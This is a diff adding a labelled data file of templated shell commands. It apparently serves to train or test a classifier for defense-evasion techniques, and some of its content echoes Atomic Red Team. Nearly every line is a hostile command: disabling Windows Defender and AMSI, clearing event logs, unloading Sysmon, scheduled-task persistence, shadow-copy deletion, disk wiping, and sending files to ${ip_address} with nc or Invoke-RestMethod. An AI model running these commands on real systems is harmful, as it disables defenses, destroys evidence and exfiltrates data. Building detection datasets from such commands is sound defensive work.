@@ -1,0 +1,60 @@
+1	Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+1	Add-MpPreference -ExclusionExtension ""${excluded}"
+1	Stop-Service -Name ${service_name}; Remove-Service -Name ${service_name}
+1	"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+1	Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+1	Add-MpPreference -ExclusionPath "${excluded}"
+1	sc stop WinDefend && sc config WinDefend start=disabled
+1	net.exe stop ${service_name} && sc.exe config ${service_name} start=disabled
+1	rm -f ${local_file_path}
+1	rm -rf ${local_directory_path}
+1	del /f ${local_file_path}
+1	rmdir /s /q ${local_directory_path}
+1	Remove-Item -path ${local_file_path}
+1	Remove-Item -Path ${local_directory_path} -Recurse
+1	schtasks /create /ru system /sc daily /tr "${command_to_execute}" /tn win32times /f
+1	sc create win32times binPath= "${command_to_execute}"
+1	schtasks /create /tn win32times /sc onlogon /tr "${command_to_execute}"
+1	schtasks /create /tn win32times /sc onstart /ru system /tr "${command_to_execute}"
+1	Add-MpPreference -ExclusionProcess "${excluded}"
+1	rundll32.exe ${dll_file},${entry_point}
+1	powershell.exe -EncodedCommand [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("${command_to_execute}"))
+1	wevtutil cl system
+1	wevtutil cl application
+1	wevtutil cl security
+1	wevtutil cl ${log_name}
+1	Get-EventLog -List | ForEach-Object {$_.Log} | ForEach-Object {Clear-EventLog -LogName $_ }
+1	fltmc.exe unload ${sysmon_driver}
+1	sysmon -u
+1	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+1	Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+0	cat ${source_file_path} | nc ${ip_address} ${port}
+0	powershell -c "vssadmin.exe delete shadows /all /quiet"
+0	psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0	rsync -r ${source_directory} ${username}@${ip_address}:${destination_directory}
+0	cat ${source_file_path} | nc -vn ${ip_address} ${port}
+0	copy ${source_file_path} \\${ip_address}\${destination_file_path}
+0	compress ${source_file_path}
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v ${value_name} /t REG_DWORD /d ${value}
+0	cmd.exe /c "sc.exe stop ${service_name}"
+0	pscp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	cmd.exe /c "${command_to_execute}"
+0	xcopy ${source_directory} ${destination_directory} /s /e
+0	cat email.txt | ssmtp ${username}@${domain}
+0	cipher.exe /w:C:
+0	xcopy ${source_file_path} \\${ip_address}\${destination_file_path}
+0	zip archive.zip ${source_file_path}
+0	Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
+0	cmd.exe /c "choco install putty"
+0	powershell -c "cipher.exe /w:C:"
+0	plink -ssh ${ip_address} -l ${username} -pw ${password}
+0	Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "powershell" -Value "${command_to_execute}"
+0	cmd.exe /c "choco install -y 7zip"
+0	qwinsta.exe /server:${computer_name}
+0	cat ${source_file_path} | nc ${ip_address} ${port}
+0	net users
+0	cat email.txt | ssmtp ${username}@${domain}
+0	cmd.exe /c "cipher.exe /w:C:"
+0	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	tar -cvzf archive.tar.gz ${source_directory}
+0	7z a -p${password} -mhe=on ${destination_file_path} ${source_file_path}
